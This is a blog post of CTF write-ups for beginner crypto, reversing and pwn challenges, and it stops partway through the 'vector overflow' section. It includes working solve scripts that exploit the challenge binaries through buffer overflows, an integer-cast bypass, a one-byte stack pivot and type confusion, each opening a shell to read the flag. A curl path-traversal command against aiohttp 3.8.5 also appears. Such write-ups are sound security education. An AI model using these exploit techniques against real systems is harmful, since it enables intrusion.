---
year: 2026
month: 08
day: 30
---
# Baby joseph writeups

This post contains my writeups for all of Joseph's baby-difficulty challenges. See [The Joseph Challenge](/blog/the-joseph-challenge) for more information.

## Overview

@TableOfContents{"depth":1}@

## rot-i

> Ypw'zj zwufpp hwu txadjkcq dtbtyu kqkwxrbvu! Mbz cjzg kv IAJBO{ndldie_al_aqk_jjrnsxee}. Xzi utj gnn olkd qgq ftk ykaqe uei mbz ocrt qi ynlu, etrm mff'n wij bf wlny mjcj :).

First word is probably `You're`. Second sentence is probably `The flag is DUCTF{...}`.

I guessed that it's vaguely related to Vigenere cipher (i.e. shifts that vary by position in the ciphertext) rather than a substitution, just because there seemed to be quite a few awkward double letters in places that seemed unlikely for double letters.

I pasted the second sentence into Cyber Chef in Vigenere decode mode and typed `theflagisductf` as the key. That outputted `tuvxyzacdfghij`. There's clearly some sort of pattern going on here, but it's not completely clear what the logic behind it would be.

I pasted the original ciphertext into the same Cyber Chef setup and typed `youre` as the key. That outputted `abcif`. It doesn't appear to be a substring of the key fragment I obtained from the second sentence, but it does seem similar (in that it has runs). I then concatenated the two keys together and began typing the alphabet in between the two to pad things out and get them to line up. At some point during that process `crypto` jumped out as the first word of the flag. Progress!

At this point, while writing my live writeup, I realised what the challenge name means... I reckon that it's a caesar cipher where the index is `i`, and it has been implemented in such a way that it uses the index of the character in the plaintext (which includes punctuation) while leaving non-alphabetic characters untouched. That would explain the alphabetic runs in my key fragments, and would also explain the skipped letters.

```py
import string

xs = "Ypw'zj zwufpp hwu txadjkcq dtbtyu kqkwxrbvu! Mbz cjzg kv IAJBO{ndldie_al_aqk_jjrnsxee}. Xzi utj gnn olkd qgq ftk ykaqe uei mbz ocrt qi ynlu, etrm mff'n wij bf wlny mjcj :)."

out = ""
for i, x in enumerate(xs):
    ls = string.ascii_lowercase
    us = string.ascii_uppercase
    if x in ls:
        out += ls[(ls.index(x) - i) % 26]
    elif x in us:
        out += us[(us.index(x) - i) % 26]
    else:
        out += x

print(out)
```

```
You've solved the beginner crypto challenge! The flag is DUCTF{crypto_is_fun_kjqlptzy}. Now get out some pen and paper for the rest of them, they won't all be this easy :).
```

It turns out that my original intuition for the first word was incorrect! It was `You've`, not `You're`.

That really shouldn't have taken me 35 minutes...

The thing that messed me up was that punctuation was being included in the indexing even though it's excluded from the encryption. Having indexed rotations crossed my mind because of all of the runs that I was getting in my key fragments, but I discarded that idea because they weren't perfect runs of characters. I even noticed that it was breaking on the punctuation specifically but I ignored that idea in the moment as a coincidence. Rookie mistakes.

Flag: `DUCTF{crypto_is_fun_kjqlptzy}`

## no strings

We're given a binary, and this is a reverse engineering challenge, so I first `strings`'d the binary, and then found nothing so I opened up the binary in Binary Ninja.

```c
printf("flag? ");
char buf[0x48];
fgets(&buf, 0x46, stdin);
int32_t var_6c = 0;
int32_t result;

while (true) {
    if ((int64_t)var_6c >= strlen(&buf) - 1) {
        puts("correct!");
        result = 0;
        break;
    }
    
    if (buf[(int64_t)var_6c] != *(uint8_t*)((int64_t)(var_6c * 2) + flag)) {
        puts("wrong!");
        result = -1;
        break;
    }
    
    var_6c += 1;
}
```

It checks each character of the input against `flag[index * 2]` (which explains why nothing would show up in the output of `strings ./nostrings`).

Double clicking the `flag` symbol in Binary Ninja just instantly solves the challenge, because Binary Ninja recognises it as some sort of wide character encoding and decodes it correctly.

```c
00404050  wchar16 const (* flag)[0x1e] = data_402008 {u"DUCTF{stringent_strings_string"}
```

Ok, much better, that challenge only took 3 minutes.

Flag: `DUCTF{stringent_strings_string`

## Substitution Cipher I

We get the following Sage script, along with an `output.txt` file;

```py
def encrypt(msg, f):
    return ''.join(chr(f.substitute(c)) for c in msg)

P.<x> = PolynomialRing(ZZ)
f = 13*x^2 + 3*x + 7

FLAG = open('./flag.txt', 'rb').read().strip()

enc = encrypt(FLAG, f)
print(enc)
```

It substitutes each character in the text with the output of a polynomial. All of the polynomial's coefficients are positive so the polynomial is monotonically increasing, meaning that each distinct character (positive by definition) will map to a distinct substitution. Don't worry if none of that makes sense, because I didn't even think of that while solving the challenge, I just went in with the assumption that the challenge is easy.

My chosen approach was to sidestep the maths by generating a lookup table from substitution to original character, and then mapping the ciphertext through that lookup table.

```py
ct = open("./output.txt", "r").read().strip()

lookup = {}
for x in range(128):
    y = 13 * x * x + 3 * x + 7
    lookup[y] = chr(x)

pt = ""
for c in ct:
    pt += lookup[ord(c)]

print(pt)
```

Another easy one out of the way; that took around 6 minutes.

Flag: `DUCTF{sh0uld'v3_us3d_r0t_13}`

## babyp(y)wn

We get given the following challenge file;

```py
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'DUCTF' in bytes(buf2):
    print(open('./flag.txt', 'r').read())
```

I assumed that `buf1` and `buf2` were both allocated on the heap (and likely one after another). `gets` gives us a trivial buffer overflow, so we can overflow from `buf1` to `buf2`. In libc each heap allocation has 16 bytes of metadata before it, so we have to overflow 512 bytes of `buf1`, then 16 bytes for the header of `buf2`, and then we can write `DUCTF` to the userdata portion of the `buf2` allocation. This lands `DUCTF` write at the start of `buf2`. Now that I'm writing this down I've realised that we get the flag as long as `DUCTF` is anywhere in `buf2`, so I could've overshot for safety, but it felt good lining it up nicely.

```py
from pwn import process

p = process(["/usr/bin/python3", "./babypywn.py"])
p.sendline(b"A" * (512 + 16) + b"DUCTF")
print(p.recvall())
```

I didn't note down exactly when I started working on this challenge, but I think it only took a few minutes.

Flag: `DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}`

## source provided

We get a binary along with the assembly source code that the binary was produced from. I've included an annotated version of the assembly program below. I just happened to remember the syscall numbers that this program uses, but [syscall.sh](https://x64.syscall.sh/) is a great resource if you ever need to get information about Linux syscalls.

```x86asm
SECTION .data
c db 0xc4, 0xda, 0xc5, 0xdb, 0xce, 0x80, 0xf8, 0x3e, 0x82, 0xe8, 0xf7, 0x82, 0xef, 0xc0, 0xf3, 0x86, 0x89, 0xf0, 0xc7, 0xf9, 0xf7, 0x92, 0xca, 0x8c, 0xfb, 0xfc, 0xff, 0x89, 0xff, 0x93, 0xd1, 0xd7, 0x84, 0x80, 0x87, 0x9a, 0x9b, 0xd8, 0x97, 0x89, 0x94, 0xa6, 0x89, 0x9d, 0xdd, 0x94, 0x9a, 0xa7, 0xf3, 0xb2

SECTION .text

global main

main:
    xor rax, rax ; rax=0 (selects the 'read' syscall)
    xor rdi, rdi
    mov rdx, 0x32
    ; allocate space on the heap
    sub rsp, 0x32
    mov rsp, rsi
    ; read 0x32 bytes into the stack (at rsp)
    syscall

    ; loop 
    mov r10, 0
l:
    ; r11 = r10th byte of input
    movzx r11, byte [rsp + r10]
    ; r12 = r10th byte of reference data
    movzx r12, byte [c + r10]
    ; r11 = (char)((r11 + r10 + 0x42) ^ 0x42)
    add r11, r10
    add r11, 0x42
    xor r11, 0x42
    and r11, 0xff
    ; if r11 != r12 { exit(1); }
    cmp r11, r12
    jne b

    ; r10 += 1
    ; if r10 == 0x32 { break; }
    add r10, 1
    cmp r10, 0x32
    jne l

    ; exit(0)
    mov rax, 0x3c
    mov rdi, 0
    syscall

b:
    mov rax, 0x3c
    mov rdi, 1
    ; exit(1)
    syscall
```

We can use a similar approach to my solution for [Substitution Cipher I](#substitution-cipher-i) and just bruteforce each character instead of actually reversing the maths. I find this approach to be less error prone during CTFs because you only have to copy the logic across from the source program (instead of copying it *and* reversing it).

```py
xs = [0xc4, 0xda, 0xc5, 0xdb, 0xce, 0x80, 0xf8, 0x3e, 0x82, 0xe8, 0xf7, 0x82, 0xef, 0xc0, 0xf3, 0x86, 0x89, 0xf0, 0xc7, 0xf9, 0xf7, 0x92, 0xca, 0x8c, 0xfb, 0xfc, 0xff, 0x89, 0xff, 0x93, 0xd1, 0xd7, 0x84, 0x80, 0x87, 0x9a, 0x9b, 0xd8, 0x97, 0x89, 0x94, 0xa6, 0x89, 0x9d, 0xdd, 0x94, 0x9a, 0xa7, 0xf3, 0xb2]

out = []
for i, x in enumerate(xs):
    found = False
    for y in range(256):
        z = ((y + i + 0x42) ^ 0x42) & 0xff
        if x == z:
            out.append(y)
            found = True
            break
    if not found:
        print(i, x)
        print("not found")
        exit()

print("".join(map(chr, out)))
```

Another nice 10 minutes challenge.

Flag: `DUCTF{r3v_is_3asy_1f_y0u_can_r34d_ass3mbly_r1ght?}`

## Baby ARX

The challenge gives us the following handout;

```py
class baby_arx():
    def __init__(self, key):
        assert len(key) == 64
        self.state = list(key)

    def b(self):
        b1 = self.state[0]
        b2 = self.state[1]
        b1 = (b1 ^ ((b1 << 1) | (b1 & 1))) & 0xff
        b2 = (b2 ^ ((b2 >> 5) | (b2 << 3))) & 0xff
        b = (b1 + b2) % 256
        self.state = self.state[1:] + [b]
        return b

    def stream(self, n):
        return bytes([self.b() for _ in range(n)])


FLAG = open('./flag.txt', 'rb').read().strip()
cipher = baby_arx(FLAG)
out = cipher.stream(64).hex()
print(out)

# cb57ba706aae5f275d6d8941b7c7706fe261b7c74d3384390b691c3d982941ac4931c6a4394a1a7b7a336bc3662fd0edab3ff8b31b96d112a026f93fff07e61b
```

The first thing that jumped out at me is that `cipher.stream(64)` essentially ends up giving you the full internal state of the cipher as it is at the end of producing that stream. That happens because the internal state is 64 bytes, and each `b` operation removes the first byte of the state while appending the newly produced byte (which it also returns) to the end of the state. So after 64 `b` operations we know the full state.

Given that we know the current state of the cipher, and we know that the state of the cipher 64 operations ago was flag, our goal should be to find a way to reverse the operation that `b` performs on the cipher's state.

Looking at the implementation of `b`, I could see that we had to compute `b1`, and that we know `b` and `b2`. Somewhat confusingly, the function reassigns the `b1` and `b2` variables, which led to a mistake that took me 5-10 minutes to debug (I was using the `b2` retrieved from the state directly instead of passing it through the 'rotate right by 5' operation first). I'm going to call the second values of `b1` and `b2`, `b1'` and `b2'` respectively.

We know `b` and we can compute `b2' = ror(b2, 5)`, so we can compute `b1'` using subtraction (modulo 256). Then all we have to do is compute `b1` from `b1'`. Once again we can use a bruteforce to avoid reversing the maths directly (which in this case might also be the only way? I dunno I haven't put much thought into that).

Piecing it all together, I ended up with the following solve script;

```py
state = list(bytes.fromhex("cb57ba706aae5f275d6d8941b7c7706fe261b7c74d3384390b691c3d982941ac4931c6a4394a1a7b7a336bc3662fd0edab3ff8b31b96d112a026f93fff07e61b"))

def undo_weird_xor(y: int) -> int:
    for x in range(256):
        if x ^ (((x << 1) | (x & 1)) & 0xff) == y:
            return x
    print("not found (weird)")
    exit(1)

def rev(state: list) -> list:
    b2 = state[0]
    b2 = (b2 ^ ((b2 >> 5) | (b2 << 3))) & 0xff
    b = state[-1]
    b1 = (b - b2) % 256
    b1 = undo_weird_xor(b1)
    return [b1] + state[:-1]

for _ in range(64):
    state = rev(state)

print(bytes(state).decode())
```

This challenge took me about 20 minutes (much of which was spent debugging the aforementioned error in my solve script).

Flag: `DUCTF{i_d0nt_th1nk_th4ts_h0w_1t_w0rks_actu4lly_92f45fb961ecf420}`

## static file server

We get the following handout; (I've omitted the index page content because it's unrelated)

```py
from aiohttp import web

async def index(request):
    return web.Response(body='...', content_type='text/html', status=200)

app = web.Application()
app.add_routes([
    web.get('/', index),

    # this is handled by https://github.com/aio-libs/aiohttp/blob/v3.8.5/aiohttp/web_urldispatcher.py#L654-L690
    web.static('/files', './files', follow_symlinks=True)
])
web.run_app(app, port=8081)`
```

The program is very simple, so it's likely that it's a path traversal bug in the library itself. The comment left by the challenge author reinforced that suspicion.

We can use CURL with `--path-as-is` to try exploiting the path traversal. If you don't supply the `--path-as-is` flag, then CURL will collapse the path traversal before sending the URL to the server, just as a browser would.

```sh
curl --path-as-is http://localhost:8080/files/../flag.txt
```

This challenge took 10 minutes, but most of that was spent trying against the wrong `aiohttp` version... (3.14.3 instead of 3.8.5)

Flag: `DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}`

## downunderflow

We get the following handout;

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USERNAME_LEN 6
#define NUM_USERS 8
char logins[NUM_USERS][USERNAME_LEN] = { "user0", "user1", "user2", "user3", "user4", "user5", "user6", "admin" };

int read_int_lower_than(int bound) {
    int x;
    scanf("%d", &x);
    if(x >= bound) {
        puts("Invalid input!");
        exit(1);
    }
    return x;
}

int main() {
    printf("Select user to log in as: ");
    unsigned short idx = read_int_lower_than(NUM_USERS - 1);
    printf("Logging in as %s\n", logins[idx]);
    if(strncmp(logins[idx], "admin", 5) == 0) {
        puts("Welcome admin.");
        system("/bin/sh");
    } else {
        system("/bin/date");
    }
}
```

We get a shell if we enter the index `7`, but `read_int_lower_than(NUM_USERS - 1)` stops us from directly entering `7`. Luckily the program casts the return value of `read_int_lower_than` from an `int` to an `unsigned short`, which gives us an opportunity to mess with things.

As long as the least significant two bytes of our chosen index (represented as a signed 32 bit integer) are `7`, then we'll get admin.

`read_int_lower_than` allows negative numbers, so we can enter a negative number with `0x0007` as its lower two bytes and get a shell.

My chosen approach was to construct our malicious index as bytes, and then interpret it as a signed integer to get the index that we pass to the program. Our only two constraints are that the lower two bytes are `0x0007` (to log in as admin) and that the highest bit is `1` (so that it gets interpreted as a negative number).

```py
import struct
from pwn import process

p = process("./downunderflow")
idx = struct.unpack("<i", 0xffff0007.to_bytes(4, byteorder="little"))[0]
p.sendlineafter(b"as: ", str(idx).encode())
p.sendlineafter(b"admin.", b"cat flag.txt")
p.sendline("exit")
print(p.recvall().decode())
```

The computed `idx` ends up being `-65529`, but there are plenty of values that work (just change the `0xffff` to whatever you want as long as the most significant bit is `1`).

Funnily enough, the author ended up using the same index (so there's probably a nicer way of getting to this number...)

This challenge took me around 15 minutes (I had to look up the `struct` docs again and my VM was being slow).

Flag: `DUCTF{-65529_==_7_(mod_65536)}`

## complementary

We get the following handout;

```py
flag = open("./flag.txt", "rb").read().strip()
m1 = int.from_bytes(flag[: len(flag) // 2])
m2 = int.from_bytes(flag[(len(flag) // 2):])
n = m1 * m2
print(n)

# 6954494065942554678316751997792528753841173212407363342283423753536991947310058248515278
```

Basically the only thing we can do to begin is to factorise `n`. I used `factorint` from `sympy` to do so, and go the following factorisation:

```py
{2: 1, 3: 1, 19: 1, 31: 1, 83: 1, 3331: 1, mpz(165219437): 1, mpz(550618493): 1, mpz(66969810339969829): 1, 1168302403781268101731523384107546514884411261: 1}
```

The keys of the dictionary are the factors, and the values are their multiplicity (e.g. if we factorised 12 then we'd get `{2: 2, 3: 1}` because its factorisation is `2 * 2 * 3`).

Now that we have the prime factorisation, we're left with a new conundrum: which factors came from `m1` and which came from `m2`?

One clue we have is that both `m1` and `m2` will either have the same number of bytes as eachother, or `m2` will have one more byte than `m1`. We can figure out how long the flag is, because `log2(m1) + log2(m2) = log2(m1 * m2)`. `log2(m1)` is the number of bits in `m1` (unknown), `log2(m2)` is the number of bits in `m2` (also unknown), and `log2(m1 * m2)` is the number of bits in `n`, which we already know.

Because we know that we're actually working in bytes, we can make things slightly easier to think about by measuring the sizes of our numbers in bytes. We can do that by taking our `log`s in base 256 instead of base 2.

`math.log(n, 256)` gives us 36.47, so `n` has 37 bytes, and by extension the flag probably has 37 bytes as well (it's probably possible to construct a non-ASCII flag that leads to this measurement being off-by-one somehow, but we don't have to worry about that and can assume that the challenge was designed to be relatively straightforward).

From that we can compute that `m1` must have 18 bytes and `m2` must have 19 bytes. It turns out that the largest factor of `n` also has 19 bytes, so it's a good candidate for `m2`. It's important to note that we could multiply that value by `2` or `3` and still have it remain 19 bytes, but I didn't have to worry about handling that in my solve script because the largest factor happened to actually be `m2` and everything worked out.

From there we can compute `m1` as the product as all of the other factors, and then we can convert `m1` and `m2` back to bytes and concatenate them back together to get the flag.

```py
from sympy import factorint
from Crypto.Util.number import long_to_bytes

factors = factorint(int(open("output.txt", "r").read().strip()))
m1 = 1
for k, v in list(factors.items())[:-1]:
    m1 *= pow(k, v)
m2 = list(factors.keys())[-1]

flag = long_to_bytes(m1) + long_to_bytes(m2)
print(flag)
```

This challenge took about 10 minutes to solve.

Flag: `DUCTF{is_1nt3ger_f4ct0r1s4t10n_h4rd?}`

## randomly chosen

We get the following handout;

```py
import random

random.seed(random.randrange(0, 1337))
flag = open('./flag.txt', 'r').read().strip()
out = ''.join(random.choices(flag, k=len(flag)*5))
print(out)

# bDacadn3af1b79cfCma8bse3F7msFdT_}11m8cicf_fdnbssUc{UarF_d3m6T813Usca?tf_FfC3tebbrrffca}Cd18ir1ciDF96n9_7s7F1cb8a07btD7d6s07a3608besfb7tmCa6sasdnnT11ssbsc0id3dsasTs?1m_bef_enU_91_1ta_417r1n8f1e7479ce}9}n8cFtF4__3sef0amUa1cmiec{b8nn9n}dndsef0?1b88c1993014t10aTmrcDn_sesc{a7scdadCm09T_0t7md61bDn8asan1rnam}sU
```

It uses randomness, but only chooses from 1337 possible, so we can bruteforce! (I'm starting to sense a theme...)

There's not too much to this one other than remembering to strip the newline from the input file when reading it in (if your code works like mine and uses `len(out)` as the number of random choices).

To replicate the form of randomness that the challenge program is doing, I construct a list with the same length as the flag, but containing indices instead of the characters of the flag. That tells us which indices got chosen, and lets us reconstruct the flag from the output (we know where each character came from).

```py
import random

out = open("output.txt", "r").read().strip()
flag_len = len(out) // 5
indices = list(range(flag_len))
for seed in range(1337):
    random.seed(seed)
    flag = ["?"] * flag_len
    xs = random.choices(indices, k=len(out))
    for x, y in zip(xs, out):
        flag[x] = y
    flag = "".join(flag)
    if flag.startswith("DUCTF"):
        print(flag)
        break
```

This challenge took around 7 minutes or so to solve.

Flag: `DUCTF{is_r4nd0mn3ss_d3t3rm1n1st1c?_cba67ea78f19bcaefd9068f1a}`

## flag art

We get the following hand out, along with an ASCII art version of the DUCTF logo;

```py
message = open('./message.txt', 'rb').read() + open('./flag.txt', 'rb').read()

palette = '.=w-o^*'
template = list(open('./mask.txt', 'r').read())

canvas = ''
for c in message:
    for m in [2, 3, 5, 7]:
        while True:
            t = template.pop(0)
            if t == 'X':
                canvas += palette[c % m]
                break
            else:
                canvas += t

print(canvas)
```

```
                                                           ==                                   
                                          wo=.=*.w.        ^==-                                 
                                     ^..ow==w*.w=o=        .w^.                                 
                                .--==w*.w=o=...=.=         *.w.^==                              
                             .-.wwo=.=*.w.^.wwo==.-=.=     *..--.=-*=                           
                           ....w.^==-^.wwo.w=o.wo*=...==.-.wwo=.o=.wo                           
                         *==w*..--..--=w=-.w.^==-^=w=-=.-^.wwo..o..wo*                          
                    =w=-.wwo==oo==w*==.-=www.wwo.wo*==w*==.-.wwo=.w=..-                         
            *..-*.wwo.=-o=.oo==.-.wwo==.-      =.=*        .wwo.wo*=w=-..                       
          ow=w=-.wwo==w*..ow=w=-.wwo                       ==.-=.=*==oo=w=-.                    
          wwo..ow==w*.w.^.=.w=.=*==o                       o.wwo=wo.=.=*..ow.=                  
          .w==.-.wwo.w=o=.=*.wwo==oo                       ==w*=www=w=-.wwo.w=o.w               
          o*=w=-.wwo==oo=w=-==.-==.-                       ==w*==-^=w=-.wwo..--=.               
          =*.w.^==-^.wwo=w=-.w.^=.=*      =.w^      ==-^   .wo*.==o.wwo=wo^=.=*=.               
            w^..ow.wwo..wo..--==w*==-^.wwo=...==.-.=-w.w   wo.w-^==.===wo..o..=..               
              =.-o..ow=.=w=.o=..-*.w.^==.-.w=o..ow=.w^=.   o=.w=o==o...-*.w.^=w.                
              o..-*..wo=w.o..wo..--.=w-==-^=w.o..wo..ow.   .-*==oo=w.o..wo..--.                 
              =w-==-^=w.o.=w-..ow==.        *=w.o.w-.===   w=w.o..--..-*..-*=                   
               www=.w^.=w.=w.o.w=              o.=w-.w-...--=.=w=w.o..-*..ow                    
                 =w.o=                             .o=.wo*==o..w.^=.=w==.                       
                                                      -=.=w=w.o..ow=.=w==                       
                                                        oo.=w-==o..w.^.=                        
                                                           .w=.   =w.                           
                                                                                                
                                                                .ow==o..w                       
                                                                .^==-^=.-                       
                                                                  .=w.*
```

By reversing the art rendering process we can obtain the result of `x % n` for each character `x` of the flag and each moduli from `[2, 3, 5, 7]`. By the Chinese Remainder Theorem (CRT), these values (called residues) allow us to distinguish between all values from 0 up to and including 209 (`2 * 3 * 5 * 7 - 1`).

There is nice maths we can do to reverse it, but I wanted to solve this challenge quickly, and there are only 128 possible values for each character of the flag (if we assume that it's ASCII). I think you can guess what approach I took instead of implementing a CRT solver...

```py
palette = '.=w-o^*'
moduli = [2, 3, 5, 7]

art = open("output.txt", "r").read().strip()

def crt_byte(residues: list[int], moduli: list[int]) -> int:
    # Bruteforce the byte! (even though there's a nice way to solve this
    # mathematically and I have a mathematics degree)
    for x in range(256):
        ys = [x % n for n in moduli]
        if ys == residues:
            return x
    print(f"not found: {residues}, {moduli}")
    exit(1)

flag = []
residues = []
for c in art:
    if c not in palette:
        continue
    idx = palette.index(c)
    residues.append(idx)
    if len(residues) == len(moduli):
        flag.append(crt_byte(residues, moduli))
        residues = []

print(bytes(flag).decode())
```

> Congratulations on solving this challenge! The mask has 900 X's so here are some random words to make the message long enough. Your flag is: DUCTF{r3c0nstruct10n_0f_fl4g_fr0m_fl4g_4r7_by_l00kup_t4bl3_0r_ch1n3s3_r3m41nd3r1ng?}

This challenge took around 5 minutes to solve.

Flag: `DUCTF{r3c0nstruct10n_0f_fl4g_fr0m_fl4g_4r7_by_l00kup_t4bl3_0r_ch1n3s3_r3m41nd3r1ng?}`

## one byte

We get the following challenge handout;

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void win() {
    system("/bin/sh");
}

int main() {
    init();

    printf("Free junk: 0x%lx\n", init);
    printf("Your turn: ");

    char buf[0x10];
    read(0, buf, 0x11);
} 
```

As the challenge name hints at, we only get a one byte overflow. I was a little confused how this was evenly remotely possible until I checked the binary with checksec;

```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No  
```

It turns out that the binary is 32 bit!

Unfortunately for me, I haven't done any 32 bit stuff in quite a while, so I needed a bit of a refresher. I probably could've looked up 32 bit pwn resources online, but I generally find that figuring things out for myself is much more valuable, so I ran the program under GDB instead and started poking.

First I set a breakpoint just before the `read` to check out the layout of the stack around the buffer that we get to write to. Immediately after our buffer there is a stack address of some sort, which I assumed was probably the saved ebp (I was wrong).

Once I had seen the layout of the stack, I set a breakpoint at the end of main just before it started doing the function return dance;

```x86asm
    0x5664028e <+96>:    mov    eax,0x0
 => 0x56640293 <+101>:   lea    esp,[ebp-0x8]
    0x56640296 <+104>:   pop    ecx
    0x56640297 <+105>:   pop    ebx
    0x56640298 <+106>:   pop    ebp
    0x56640299 <+107>:   lea    esp,[ecx-0x4]
    0x5664029c <+110>:   ret
```

As I stepped through I discovered that the value that we partially control on the stack makes its way into esp (offset by 4) right before the function returns. The x86 `ret` instruction pops the return address off the stack, so we effectively return to whatever lives at `our_partially_controlled_value - 0x4`. Under normal operation, the return address is stored between the current stack frame and the one below, so it should be stored near our buffer. That's good for us because it means that our buffer should be within a one byte change of the original address.

My exploit strategy was to fill the buffer with the `win` address (which we can easily compute from the `init` address that the program leaks for us) and then overwrite the least significant byte of the saved `esp` address with an arbitrary fixed value (in my case `\x20`) and hope that the stack slide works out such that the tweaked `esp` value points to one of our return addresses. The stack slide is randomised for each process, so we can just retry the exploit until we get a hit. Note that we don't actually have to spam the `win` address, because on a successful exploit our controlled esp will always line up with the 4th copy of the win address due to the way things align, but in the moment it was easier to just spam them rather than think it through.

```py
from pwn import process, ELF, cyclic, pause, p32

bin = ELF("./onebyte")
offset = bin.symbols["win"] - bin.symbols["init"]

p = process("./onebyte")

p.recvuntil(b"junk: ")
leak = int(p.recvline().strip().decode()[2:], 16)
win = leak + offset

p.send(p32(win) * 4 + b"\x20")
p.sendline(b"cat flag.txt")
p.sendline(b"exit")
print(p.recvall())
```

This challenge took me around 40 minutes to solve. I haven't done 32 bit stuff properly for ages, so I had to fill gaps in my mental model with GDB. Overall I feel like this challenge taught me a surprising amount for a 'baby' challenge!

Flag: `DUCTF{all_1t_t4k3s_is_0n3!}`

## confusing

Here's the handout that we get (with some unrelated bits omitted);

```c
int main() {
    short d;
    double f;
    char s[4];
    int z; 

    printf("Give me d: ");
    scanf("%lf", &d);

    printf("Give me s: ");
    scanf("%d", &s);

    printf("Give me f: ");
    scanf("%8s", &f);

    if(z == -1 && d == 13337 && f == 1.6180339887 && strncmp(s, "FLAG", 4) == 0) {
        system("/bin/sh");
    }
}
```

This is clearly a 'skill check'-type challenge rather than an exploitation one. The challenge is testing whether we can manipulate type confusions effectively in C.

In challenge like these where the layout of the stack is important, it can be a good idea to check the stack layout with a decompiler such as Binary Ninja instead of trying to guess the stack layout yourself, because compilers do all sorts of funny things.

In our case, `d` is at `rbp-0x26`, `z` is at `rbp-0x24`, `s` is at `rbp-0x14`, and `f` is at `rbp-0x20`.

The first write we get overrides `d`, `z`, and two bytes of `f`. We later get to overwrite `f` in full, so we only have to worry about `d` and `z` for now. We want `d` to be 13337 (0x3419) and `z` to be `-1` (0xffffffff). Therefore we want the bitpattern of the value we provide to be `0x6767_ffff_ffff_3419` (where the 0x6767 part is unconstrained). We have to provide the value as a double, so we need to choose our upper two bytes such that the value represents a valid double. I tried `ffff` and that gave me NaN (no good). Then I tried `0000` and that worked a charm. The double value corresponding to `0x0000_ffff_ffff_3419` is `1.390671161309104e-309` (and scanf luckily supports `e` notation when parsing floating point numbers).

> [!NOTE]
> I enjoy Swift's integer/floating point APIs, so I actually did the initial experimentation in a Swift REPL. I typed `Double(bitPattern: 0x0000_ffff_ffff_3419)` to retrieve the double value corresponding to the bytes I wanted. It was only later while cleaning up the solve script for this writeup that I replace the hardcoded double value from my Swift experimentation with a value dynamically computed using the `struct` library (and emulating what that simple Swift expression was doing).

Next we get to write a 4 byte integer to `s`, which has to have the value `"FLAG"`. This is pretty standard in binary exploitation, and we can use `u32` to achieve the conversion from bytes to integer that we want.

Finally we get to write an 8 byte string to `f`, and `f` needs to have the value `1.6180339887` (which is the golden ratio). We can use `struct.pack` to convert our target value to bytes.

Putting it all together, we get the following solve script;

```python
import struct
from pwn import process, u32

p = process("./confusing")

# swift equiv: Double(bitPattern: 0x0000_ffff_ffff_3419)
xs = 0x0000_ffff_ffff_3419.to_bytes(8, byteorder="little")
p.sendlineafter(b"d: ", str(struct.unpack("<d", xs)[0]).encode())
p.sendlineafter(b"s: ", str(u32(b"FLAG")).encode())
p.sendlineafter(b"f: ", struct.pack("<d", 1.6180339887))

p.sendline(b"cat flag.txt")
p.sendline(b"exit")
print(p.recvall().strip().decode())
```

This challenge took around 10 minutes.

Flag: `DUCTF{typ3_c0nfus1on_c4n_b3_c0nfus1ng!}`

## number mashing

For this challenge we only receive an ARM binary. I'm on Apple Silicon and I can natively run the challenge in a docker container. So I created a Dockerfile to do so;

```
FROM ubuntu:22.04

WORKDIR /app
COPY number-mashing /app
COPY flag.txt /app
CMD ["./number-mashing"]
```

```sh
docker build -t number_mashing .
docker run -it number_mashing /bin/bash
```

If we run the program it asks us to "give it some numbers".

The next logical step is to open the program in Binary Ninja to see what it's actually doing. Some quick manual reverse engineering gets us the following insights;

- The program accepts two 32 bit integers separated by spaces as input
- The first number must not be 0
- The second number must not be 0 or 1
- We get the flag if `num1 s/ num2 == num1` (where `s/` is signed integer division)

I figured that there must be some funny ARM edgecase that leads to this mathematically impossible (when interpreted over the integers) set up being satisfiable.

A quick search for "arm signed division quirk" brought me to [some documentation for the ARM sdiv instruction](https://mikhailarkhipov.github.io/ARM-doc/A32/sdiv.html). Of particular interest to us, the documentation discusses an edge case related to overflow;

> If the signed integer division 0x80000000 / 0xFFFFFFFF is performed, the pseudocode produces the intermediate integer result 2^31, that overflows the 32-bit signed integer range. No indication of this overflow case is produced, and the 32-bit result written to <Rd> must be the bottom 32 bits of the binary representation of 2^31. So the result of the division is 0x80000000.

This differs from the equivalent x86 [idiv](https://www.felixcloutier.com/x86/idiv) instruction which triggers a 'divide error' exception on overflow.

Luckily for us, the ARM documentation gives us the exact numbers that trigger this edge case, and confirms that the given inputs will satisfy `num1 s/ num2 == num1`.

```
root@e06a3c3c2c8a:/app# ./number-mashing
Give me some numbers: 2147483648 4294967295
Correct! DUCTF{w0w_y0u_just_br0ke_math!!}
```

This was a nice beginner challenge, and it taught me something new! It probably took like 10 minutes all up if I include setting up the custom Dockerfile.

Flag: `DUCTF{w0w_y0u_just_br0ke_math!!}`

## vector overflow

We get a compiled binary along with its source code which I've included here (compressed for blog viewing);

```cpp
#include <cstdlib>
#include <iostream>
#include <string>
#include <vector>

char buf[16];
std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};

void lose() { puts("Bye!"); exit(1); }
void win() { system("/bin/sh"); exit(0); }

int main() {
    char ductf[6] = "DUCTF";
    char* d = ductf;

    std::cin >> buf;
    if(v.size() == 5) {
        for(auto &c : v) {
            if(c != *d++) {
                lose();
            }
        }
        win();
    }
    lose();
}
```

`std::cin >> buf` is basically equivalent to `gets` and gives us a trivial buffer overflow. Our goal is to end up with `v` containing the string `DUCTF` after our input, and `buf` sits directly before `v` in memory (I never actually verified that statically but I figured that if my first exploit attempt failed then I'd double check if there was any padding).

Clearly we want to rewrite `v` in some way. To do so in a way that achieves our goal, we'll have to know how a `std::vector` gets laid out in memory. With a quick search I found [a blog post that documents the memory layout of std::vector](http://www.max-sperling.bplaced.net/?p=4983). A `std::vector` is made up of three pointers, a pointer to the start of the vector, a pointer to the end of the vector, and a pointer to the end of the vector's allocation (which might include reserved but unused space).

